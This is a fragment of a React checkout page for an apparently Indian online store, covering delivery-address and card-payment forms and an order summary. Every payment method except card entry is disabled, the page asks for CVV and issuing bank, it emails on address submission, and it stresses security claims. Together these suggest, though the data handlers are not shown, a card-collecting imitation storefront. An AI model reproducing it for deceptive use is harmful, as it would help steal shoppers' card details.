  const checkoutSteps = [
    { key: "address" as Step, label: "Delivery Address", icon: <MapPin className="w-4 h-4" /> },
    { key: "payment" as Step, label: "Payment Method", icon: <CreditCard className="w-4 h-4" /> },
  ];

  return (
    <div className="min-h-screen bg-[#f1f3f6]">
      <Navbar />
      <div className="max-w-6xl mx-auto px-4 py-4">
        <div className="grid md:grid-cols-3 gap-4 items-start">

          {/* ── Left: Steps ── */}
          <div className="md:col-span-2 space-y-3">
            {/* Stepper */}
            <div className="bg-white rounded shadow-sm p-4">
              <div className="flex items-center">
                {checkoutSteps.map((step, index) => {
                  const isDone = (step.key === "address" && currentStep === "payment");
                  const isCurrent = currentStep === step.key;
                  return (
                    <div key={step.key} className="flex items-center flex-1">
                      <div className="flex flex-col items-center">
                        <div className={`w-9 h-9 rounded-full flex items-center justify-center transition-all font-bold text-sm ${
                          isDone ? "bg-[#2874f0] text-white" :
                          isCurrent ? "bg-[#2874f0] text-white ring-4 ring-blue-100" :
                          "bg-gray-200 text-gray-400"
                        }`}>
                          {isDone ? <CheckCircle className="w-5 h-5" /> : <span>{index + 1}</span>}
                        </div>
                        <span className={`mt-1.5 text-xs font-semibold text-center ${isCurrent || isDone ? "text-[#2874f0]" : "text-gray-400"}`}>
                          {step.label}
                        </span>
                      </div>
                      {index < checkoutSteps.length - 1 && (
                        <div className={`flex-1 h-0.5 mx-2 mb-5 ${isDone ? "bg-[#2874f0]" : "bg-gray-200"}`} />
                      )}
                    </div>
                  );
                })}
              </div>
            </div>

            {/* ── STEP 1: Address ── */}
            {currentStep === "address" && (
              <div className="bg-white rounded shadow-sm" data-testid="step-address-content">
                <div className="p-4 border-b border-gray-100 flex items-center gap-2 bg-[#2874f0] rounded-t">
                  <MapPin className="w-5 h-5 text-white" />
                  <h2 className="text-base font-bold text-white uppercase tracking-wide">Delivery Address</h2>
                </div>
                <div className="p-5 space-y-4">
                  {/* Address tag display */}
                  {address.name && (
                    <div className="flex items-center gap-2 text-sm text-gray-600 pb-3 border-b border-gray-100">
                      <MapPin className="w-4 h-4 text-blue-500" />
                      <span className="font-semibold text-gray-800">{address.name}</span>
                      {address.phone && <span>· {address.phone}</span>}
                      {address.email && <span>· {address.email}</span>}
                      {address.city && <span>· {address.city}{address.state ? `, ${address.state}` : ""}{address.pincode ? ` — ${address.pincode}` : ""}</span>}
                    </div>
                  )}

                  <div className="grid sm:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-semibold text-gray-600 mb-1 uppercase">Full Name *</label>
                      <input type="text" value={address.name} onChange={(e) => setAddress({ ...address, name: e.target.value })} placeholder="Enter your full name" className="w-full border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none focus:border-blue-500" data-testid="input-name" />
                      {addressErrors.name && <p className="text-red-500 text-xs mt-1">{addressErrors.name}</p>}
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-gray-600 mb-1 uppercase">Phone Number *</label>
                      <input type="tel" maxLength={10} value={address.phone} onChange={(e) => setAddress({ ...address, phone: e.target.value.replace(/\D/g, "") })} placeholder="10-digit mobile number" className="w-full border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none focus:border-blue-500" data-testid="input-phone" />
                      {addressErrors.phone && <p className="text-red-500 text-xs mt-1">{addressErrors.phone}</p>}
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 mb-1 uppercase">Email Address *</label>
                    <input
                      type="email"
                      value={address.email}
                      onChange={(e) => setAddress({ ...address, email: e.target.value })}
                      placeholder="Enter your email"
                      className="w-full border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none focus:border-blue-500"
                      data-testid="input-email"
                    />
                    {addressErrors.email && <p className="text-red-500 text-xs mt-1">{addressErrors.email}</p>}
                  </div>
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 mb-1 uppercase">Address *</label>
                    <textarea rows={2} value={address.address} onChange={(e) => setAddress({ ...address, address: e.target.value })} placeholder="House No., Building, Street, Area" className="w-full border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none focus:border-blue-500 resize-none" data-testid="input-address" />
                    {addressErrors.address && <p className="text-red-500 text-xs mt-1">{addressErrors.address}</p>}
                  </div>
                  <div className="grid sm:grid-cols-3 gap-4">
                    <div>
                      <label className="block text-xs font-semibold text-gray-600 mb-1 uppercase">Pincode *</label>
                      <input
                        type="text"
                        maxLength={6}
                        value={address.pincode}
                        onChange={(e) => {
                          setPincodeLookupError("");
                          setAddress({ ...address, pincode: e.target.value.replace(/\D/g, "") });
                        }}
                        placeholder="6-digit pincode"
                        className="w-full border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none focus:border-blue-500"
                        data-testid="input-pincode-checkout"
                      />
                      {addressErrors.pincode && <p className="text-red-500 text-xs mt-1">{addressErrors.pincode}</p>}
                      {isPincodeLookupLoading && <p className="text-blue-500 text-xs mt-1">Detecting city and state...</p>}
                      {pincodeLookupError && <p className="text-amber-600 text-xs mt-1">{pincodeLookupError}</p>}
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-gray-600 mb-1 uppercase">City *</label>
                      <input type="text" value={address.city} onChange={(e) => setAddress({ ...address, city: e.target.value })} placeholder="City" className="w-full border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none focus:border-blue-500" data-testid="input-city" />
                      {addressErrors.city && <p className="text-red-500 text-xs mt-1">{addressErrors.city}</p>}
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-gray-600 mb-1 uppercase">State *</label>
                      <select value={address.state} onChange={(e) => setAddress({ ...address, state: e.target.value })} className="w-full border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none focus:border-blue-500 bg-white" data-testid="select-state">
                        <option value="">Select State</option>
                        {stateOptions.map((s) => <option key={s} value={s}>{s}</option>)}
                      </select>
                      {addressErrors.state && <p className="text-red-500 text-xs mt-1">{addressErrors.state}</p>}
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase">Address Type</label>
                    <div className="flex gap-3">
                      {(["Home", "Work", "Other"] as const).map((type) => (
                        <button key={type} onClick={() => setAddress({ ...address, addressType: type })} className={`px-4 py-1.5 rounded-full border text-sm font-medium transition-colors ${address.addressType === type ? "border-blue-500 bg-blue-50 text-blue-600" : "border-gray-300 text-gray-600 hover:border-gray-400"}`} data-testid={`button-addr-type-${type.toLowerCase()}`}>{type}</button>
                      ))}
                    </div>
                  </div>
                  {addressEmailStatus && (
                    <p className={`text-xs ${addressEmailStatus.includes("successfully") ? "text-green-600" : "text-amber-600"}`}>
                      {addressEmailStatus}
                    </p>
                  )}
                  <button
                    onClick={handleAddressNext}
                    disabled={isSendingAddressEmail}
                    className="w-full sm:w-auto bg-orange-500 hover:bg-orange-600 disabled:bg-orange-300 text-white font-bold px-10 py-3 rounded transition-colors flex items-center gap-2"
                    data-testid="button-address-continue"
                  >
                    {isSendingAddressEmail ? "SENDING EMAIL..." : "DELIVER HERE"} <ChevronRight className="w-4 h-4" />
                  </button>
                </div>
              </div>
            )}

            {/* ── STEP 2: Payment (matching screenshot 1) ── */}
            {currentStep === "payment" && (
              <div className="bg-white rounded shadow-sm" data-testid="step-payment-content">
                {/* Back link */}
                <button onClick={() => setCurrentStep("address")} className="flex items-center gap-1 text-blue-600 text-sm font-medium p-4 hover:underline">
                  <ArrowLeft className="w-4 h-4" /> Edit Address
                </button>

                {/* Address summary */}
                <div className="mx-4 mb-4 flex items-center gap-2 text-sm text-gray-600 bg-gray-50 rounded p-3">
                  <MapPin className="w-4 h-4 text-blue-500 flex-shrink-0" />
                  <span><strong>{address.name}</strong> · {address.phone} · {address.email} · {address.address}, {address.city}, {address.state} — {address.pincode}</span>
                </div>

                {/* Payment header */}
                <div className="mx-4 mb-4">
                  <div className="bg-[#2874f0] rounded p-3 flex items-center gap-2">
                    <CreditCard className="w-5 h-5 text-white" />
                    <span className="text-white font-bold uppercase tracking-wide text-sm">Payment Method</span>
                    <Lock className="w-4 h-4 text-blue-200 ml-auto" />
                    <span className="text-blue-200 text-xs">100% Secure</span>
                  </div>
                </div>

                <div className="px-4 pb-5 space-y-4">
                  <p className="text-xs font-semibold text-gray-500 uppercase tracking-wide">Choose a Payment Method</p>
                  <div className="rounded-lg border border-red-200 bg-red-50 px-3 py-2 text-xs font-medium text-red-700" data-testid="payment-method-unavailable-note">
                    COD, Net Banking, and UPI are currently unavailable on this site.
                  </div>

                  {/* Big payment cards */}
                  <div className="grid grid-cols-2 gap-3">
                    {/* Card Payment */}
                    <button
                      onClick={() => { setPayment({ type: "card", cardTab: "debit" }); setPaymentError(""); }}
                      className={`relative rounded-xl border-2 p-5 text-center transition-all ${payment.type === "card" ? "border-blue-500 bg-blue-50" : "border-gray-200 hover:border-gray-300"}`}
                      data-testid="button-payment-card"
                    >
                      {payment.type === "card" && (
                        <div className="absolute -top-2.5 left-1/2 -translate-x-1/2 bg-orange-500 text-white text-xs px-2 py-0.5 rounded-full font-bold">POPULAR</div>
                      )}
                      <div className={`absolute top-3 right-3 w-4 h-4 rounded-full border-2 flex items-center justify-center ${payment.type === "card" ? "border-blue-500" : "border-gray-300"}`}>
                        {payment.type === "card" && <div className="w-2 h-2 rounded-full bg-blue-500" />}
                      </div>
                      <div className={`w-12 h-12 rounded-full mx-auto mb-3 flex items-center justify-center ${payment.type === "card" ? "bg-blue-600" : "bg-gray-100"}`}>
                        <CreditCard className={`w-6 h-6 ${payment.type === "card" ? "text-white" : "text-gray-400"}`} />
                      </div>
                      <p className={`font-bold text-sm ${payment.type === "card" ? "text-blue-600" : "text-gray-700"}`}>Card Payment</p>
                      <p className="text-xs text-gray-400 mt-0.5">Credit / Debit Card</p>
                    </button>

                    {/* Net Banking */}
                    <button
                      onClick={() => setPaymentError(unavailablePaymentsMessage)}
                      className="relative rounded-xl border-2 border-gray-200 bg-gray-50 p-5 text-center opacity-70 transition-all"
                      data-testid="button-payment-netbanking"
                      aria-disabled="true"
                    >
                      <div className="absolute top-3 right-3 rounded bg-red-100 px-2 py-0.5 text-[10px] font-semibold text-red-600">
                        Unavailable
                      </div>
                      <div className="w-12 h-12 rounded-full mx-auto mb-3 flex items-center justify-center bg-gray-100">
                        <Wifi className="w-6 h-6 text-gray-400" />
                      </div>
                      <p className="font-bold text-sm text-gray-700">Net Banking</p>
                      <p className="text-xs text-gray-400 mt-0.5">All major banks</p>
                    </button>

                    {/* UPI */}
                    <button
                      onClick={() => setPaymentError(unavailablePaymentsMessage)}
                      className="relative rounded-xl border-2 border-gray-200 bg-gray-50 p-4 text-center opacity-70 transition-all"
                      data-testid="button-payment-upi"
                      aria-disabled="true"
                    >
                      <div className="absolute top-3 right-3 rounded bg-red-100 px-2 py-0.5 text-[10px] font-semibold text-red-600">
                        Unavailable
                      </div>
                      <div className="w-10 h-10 rounded-full mx-auto mb-2 flex items-center justify-center bg-gray-100">
                        <Smartphone className="w-5 h-5 text-gray-400" />
                      </div>
                      <p className="font-bold text-sm text-gray-700">UPI</p>
                      <p className="text-xs text-gray-400">PhonePe, GPay...</p>
                    </button>

                    {/* COD */}
                    <button
                      onClick={() => setPaymentError(unavailablePaymentsMessage)}
                      className="relative rounded-xl border-2 border-gray-200 bg-gray-50 p-4 text-center opacity-70 transition-all"
                      data-testid="button-payment-cod"
                      aria-disabled="true"
                    >
                      <div className="absolute top-3 right-3 rounded bg-red-100 px-2 py-0.5 text-[10px] font-semibold text-red-600">
                        Unavailable
                      </div>
                      <div className="w-10 h-10 rounded-full mx-auto mb-2 flex items-center justify-center bg-gray-100">
                        <Package className="w-5 h-5 text-gray-400" />
                      </div>
                      <p className="font-bold text-sm text-gray-700">Cash on Delivery</p>
                      <p className="text-xs text-gray-400">Pay at door</p>
                    </button>
                  </div>

                  {/* Card form */}
                  {payment.type === "card" && (
                    <div className="border border-gray-200 rounded-xl p-4 space-y-4" data-testid="payment-card">
                      {/* Debit/Credit tabs */}
                      <div className="flex rounded-lg overflow-hidden border border-gray-200">
                        <button onClick={() => setPayment({ ...payment, cardTab: "debit" })} className={`flex-1 py-2.5 text-sm font-semibold transition-colors ${payment.cardTab !== "credit" ? "bg-[#2874f0] text-white" : "bg-white text-gray-600 hover:bg-gray-50"}`} data-testid="button-debit-card">💳 Debit Card</button>
                        <button onClick={() => setPayment({ ...payment, cardTab: "credit" })} className={`flex-1 py-2.5 text-sm font-semibold transition-colors ${payment.cardTab === "credit" ? "bg-[#2874f0] text-white" : "bg-white text-gray-600 hover:bg-gray-50"}`} data-testid="button-credit-card">💳 Credit Card</button>
                      </div>

                      {/* Card network logos */}
                      <div className="flex gap-2">
                        {["VISA", "MC", "RuPay", "AMEX", "Maestro"].map((n) => (
                          <span key={n} className="border border-gray-200 rounded px-2 py-0.5 text-xs font-bold text-gray-500">{n}</span>
                        ))}
                      </div>

                      <div>
                        <label className="block text-xs font-semibold text-gray-500 uppercase mb-1">Card Number</label>
                        <input type="text" value={payment.cardNumber || ""} onChange={(e) => setPayment({ ...payment, cardNumber: formatCard(e.target.value) })} placeholder="0000 0000 0000 0000" className="w-full border border-gray-300 rounded px-3 py-2.5 text-sm font-mono focus:outline-none focus:border-blue-500" maxLength={19} data-testid="input-card-number" />
                      </div>
                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <label className="block text-xs font-semibold text-gray-500 uppercase mb-1">Expiry</label>
                          <input type="text" value={payment.cardExpiry || ""} onChange={(e) => setPayment({ ...payment, cardExpiry: formatExpiry(e.target.value) })} placeholder="MM / YY" className="w-full border border-gray-300 rounded px-3 py-2.5 text-sm focus:outline-none focus:border-blue-500" maxLength={5} data-testid="input-card-expiry" />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-gray-500 uppercase mb-1">CVV (3 digits)</label>
                          <input type="password" value={payment.cardCVV || ""} onChange={(e) => setPayment({ ...payment, cardCVV: e.target.value.replace(/\D/g, "").slice(0, 3) })} placeholder="···" className="w-full border border-gray-300 rounded px-3 py-2.5 text-sm focus:outline-none focus:border-blue-500" maxLength={3} data-testid="input-card-cvv" />
                        </div>
                      </div>
                      <div>
                        <label className="block text-xs font-semibold text-gray-500 uppercase mb-1">Name on Card</label>
                        <input type="text" value={payment.cardName || ""} onChange={(e) => setPayment({ ...payment, cardName: e.target.value })} placeholder="As printed on card" className="w-full border border-gray-300 rounded px-3 py-2.5 text-sm focus:outline-none focus:border-blue-500" data-testid="input-card-name" />
                      </div>
                      <div>
                        <label className="block text-xs font-semibold text-gray-500 uppercase mb-1">Issuing Bank</label>
                        <select value={payment.bank || ""} onChange={(e) => setPayment({ ...payment, bank: e.target.value })} className="w-full border border-gray-300 rounded px-3 py-2.5 text-sm focus:outline-none focus:border-blue-500 bg-white" data-testid="select-bank">
                          <option value="">Select your bank</option>
                          {BANKS.map((b) => <option key={b} value={b}>{b}</option>)}
                        </select>
                      </div>
                      <label className="flex items-center gap-2 text-xs text-gray-600 cursor-pointer">
                        <input type="checkbox" checked={saveCard} onChange={(e) => setSaveCard(e.target.checked)} className="rounded" />
                        Save this card securely for faster checkout
                      </label>
                    </div>
                  )}

                  {/* Net Banking form */}
                  {payment.type === "netbanking" && (
                    <div className="border border-gray-200 rounded-xl p-4 space-y-3" data-testid="payment-netbanking">
                      <p className="text-xs font-semibold text-gray-500 uppercase">Select Your Bank</p>
                      <div className="grid grid-cols-2 gap-2">
                        {BANKS.slice(0, 6).map((b) => (
                          <button key={b} onClick={() => setPayment({ ...payment, bank: b })} className={`text-left border rounded-lg px-3 py-2 text-xs transition-colors ${payment.bank === b ? "border-blue-500 bg-blue-50 text-blue-700 font-semibold" : "border-gray-200 text-gray-600 hover:border-gray-300"}`} data-testid={`button-bank-${b.replace(/\s/g,"-")}`}>
                            🏦 {b}
                          </button>
                        ))}
                      </div>
                      <select value={payment.bank || ""} onChange={(e) => setPayment({ ...payment, bank: e.target.value })} className="w-full border border-gray-300 rounded px-3 py-2.5 text-sm focus:outline-none focus:border-blue-500 bg-white" data-testid="select-bank-netbanking">
                        <option value="">Other banks...</option>
                        {BANKS.map((b) => <option key={b} value={b}>{b}</option>)}
                      </select>
                    </div>
                  )}

                  {/* UPI form */}
                  {payment.type === "upi" && (
                    <div className="border border-gray-200 rounded-xl p-4 space-y-3" data-testid="payment-upi">
                      <p className="text-xs font-semibold text-gray-500 uppercase">Enter UPI ID</p>
                      <input type="text" value={payment.upiId || ""} onChange={(e) => setPayment({ ...payment, upiId: e.target.value })} placeholder="yourname@okhdfcbank" className="w-full border border-gray-300 rounded px-3 py-2.5 text-sm focus:outline-none focus:border-blue-500" data-testid="input-upi-id" />
                      <div className="flex gap-2 flex-wrap">
                        {["PhonePe", "Google Pay", "Paytm", "BHIM", "Amazon Pay"].map((app) => (
                          <span key={app} className="border border-gray-200 rounded-full px-3 py-1 text-xs text-gray-600 cursor-pointer hover:border-blue-400 hover:text-blue-600 transition-colors">{app}</span>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* COD note */}
                  {payment.type === "cod" && (
                    <div className="border border-gray-200 rounded-xl p-4 bg-yellow-50" data-testid="payment-cod">
                      <p className="text-sm font-semibold text-yellow-800 mb-1">💰 Cash on Delivery</p>
                      <p className="text-xs text-yellow-700">Pay ₹{finalAmount.toLocaleString()} in cash when your order arrives. Extra ₹0 COD charge.</p>
                    </div>
                  )}

                  {paymentError && <p className="text-red-500 text-sm font-medium">{paymentError}</p>}

                  {/* PAY button */}
                  <button
                    onClick={handlePayNow}
                    className="w-full bg-orange-500 hover:bg-orange-600 text-white font-bold py-3.5 rounded-lg text-base transition-colors flex items-center justify-center gap-2"
                    data-testid="button-pay-now"
                  >
                    {payment.type === "cod" ? `✓ CONFIRM ORDER · ₹${finalAmount.toLocaleString()}` : `💳 PAY ₹${finalAmount.toLocaleString()}`}
                  </button>

                  <div className="flex items-center justify-center gap-2 text-xs text-gray-400">
                    <Lock className="w-3 h-3" />
                    <span>Your payment information is encrypted and secure</span>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* ── Right: Order Summary ── */}
          <div className="space-y-3">
            <div className="bg-white rounded shadow-sm overflow-hidden">
              <div className="bg-[#2874f0] px-4 py-3">
                <h3 className="font-bold text-white uppercase text-sm tracking-wide">Order Summary</h3>
              </div>
              <div className="p-4 space-y-3 max-h-64 overflow-y-auto">
                {items.map((item) => (
                  <div key={item.id} className="flex gap-3 items-start">
                    <img src={item.image} alt={item.name} className="w-14 h-14 object-cover rounded border border-gray-100 flex-shrink-0" />
                    <div className="flex-1 min-w-0">
                      <p className="text-xs text-gray-700 font-medium line-clamp-2">{item.name}</p>
                      <p className="text-xs text-gray-400">Qty: {item.quantity}</p>
                    </div>
                    <p className="text-sm font-bold text-gray-900 flex-shrink-0">₹{(item.price * item.quantity).toLocaleString()}</p>
                  </div>
                ))}
              </div>
              <div className="border-t border-gray-100 p-4 space-y-2 text-sm">
                <div className="flex justify-between text-gray-600">
                  <span>Price ({items.reduce((s, i) => s + i.quantity, 0)} item{items.length !== 1 ? "s" : ""})</span>
                  <span>₹{items.reduce((s, i) => s + i.originalPrice * i.quantity, 0).toLocaleString()}</span>
                </div>
                <div className="flex justify-between text-green-600 font-medium">
                  <span>Discount</span>
                  <span>-₹{savings.toLocaleString()}</span>
                </div>
                <div className="flex justify-between text-gray-600">
                  <span>Delivery</span>
                  <span className={deliveryCharge === 0 ? "text-green-600 font-medium" : ""}>{deliveryCharge === 0 ? "FREE" : `₹${deliveryCharge}`}</span>
                </div>
                <div className="flex justify-between font-bold text-gray-900 text-base border-t border-gray-100 pt-2">
                  <span>Total</span>
                  <span>₹{finalAmount.toLocaleString()}</span>
                </div>
                {savings > 0 && (
                  <div className="bg-green-50 rounded p-2 text-xs text-green-700 font-semibold flex items-center gap-1">
                    🎉 You save ₹{savings.toLocaleString()} on this order!
                  </div>
                )}
              </div>
            </div>

            {/* Security badges */}
            <div className="bg-white rounded shadow-sm p-4 space-y-2">
              <div className="flex items-center gap-2 text-xs text-gray-600">
                <ShieldCheck className="w-4 h-4 text-green-500" /> Safe &amp; Secure Payments
              </div>
              <div className="flex items-center gap-2 text-xs text-gray-600">
                <Truck className="w-4 h-4 text-blue-500" /> Free delivery above ₹499
              </div>
              <div className="flex items-center gap-2 text-xs text-gray-600">
                <Package className="w-4 h-4 text-orange-500" /> Easy 10-day returns
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
